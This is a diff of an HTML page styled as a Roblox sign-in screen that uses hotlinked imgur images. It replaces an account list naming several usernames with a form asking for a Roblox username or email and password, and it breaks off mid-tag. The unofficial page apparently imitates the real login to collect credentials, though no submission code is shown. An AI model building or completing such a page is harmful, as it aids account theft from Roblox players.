@@ -16,6 +16,7 @@
       color: white;
       display: flex;
       min-height: 100vh;
+      overflow-x: hidden;
     }
 
     /* Left Panel */
@@ -244,28 +245,37 @@
       <img src="https://i.imgur.com/5VQc0Gd.jpg" alt="Roblox">
       ROBLOX
     </div>
-    <div class="panel-title">Choose an account</div>
-    <div class="panel-subtitle">Pick up where you left off</div>
+    <div class="panel-title">Sign In</div>
+    <div class="panel-subtitle">Enter your Roblox credentials to continue.</div>
 
-    <!-- Account List -->
-    <div style="background: #222; padding: 15px; border-radius: 4px; margin-bottom: 20px;">
-      <div style="display: flex; align-items: center; margin-bottom: 10px; padding: 10px; background: #333; border-radius: 4px;">
-        <div style="width: 32px; height: 32px; background: #ff5722; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 10px;">
-          <span style="color: white; font-weight: bold;">f</span>
-        </div>
-        <div>
-          <div style="font-weight: bold;">fat</div>
-          <div style="font-size: 12px; color: #999;">@mini_ChikleT246</div>
-        </div>
+    <!-- Login Form -->
+    <form id="loginForm" class="login-form">
+      <div class="form-group">
+        <label for="username">Username or Email</label>
+        <input type="text" id="username" name="username" placeholder="Enter your username or email" required>
       </div>
-      <div style="display: flex; align-items: center; margin-bottom: 10px; padding: 10px; background: #333; border-radius: 4px;">
-        <div style="width: 32px; height: 32px; background: #4caf50; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 10px;">
-          <span style="color: white; font-weight: bold;">c</span>
-        </div>
-        <div>
-          <div style="font-weight: bold;">cakecakecakecake08</div>
-          <div style="font-size: 12px; color: #999;">@cakecakecakecake08</div>
-        </div>
+      <div class="form-group">
+        <label for="password">Password</label>
+        <input type="password" id="password" name="password" placeholder="Enter your password" required>
       </div>
-      <div style="display: flex; align-items: center; padding: 10px; background: #333; border-radius: 4px;">
-        <div style="width: 32px; height: 32px; background: #2196f3; border-radius: 50%; display: flex;
+      <button type="submit" class="login-btn">Sign In</button>
+    </form>
+
+    <div class="divider">
+      <div class="divider-line"></div>
+      <div class="divider-text">or</div>
+      <div class="divider-line"></div>
+    </div>
+
+    <div class="signup-link">
+      Don't have an account? <a href="#">Sign up</a>
+    </div>
+  </div>
+
+  <!-- Right Panel -->
+  <div class="right-panel">
+    <div class="game-tiles">
+      <div class="game-tile"><img src="https://i.imgur.com/5VQc0Gd.jpg" alt="Game 1"></div>
+      <div class="game-tile"><img src="https://i.imgur.com/5VQc0Gd.jpg" alt="Game 2"></div>
+      <div class="game-tile"><img src="https://i.imgur.com/5VQc0Gd.jpg" alt="Game 3"></div>
+      <div class="game-tile"><img src="
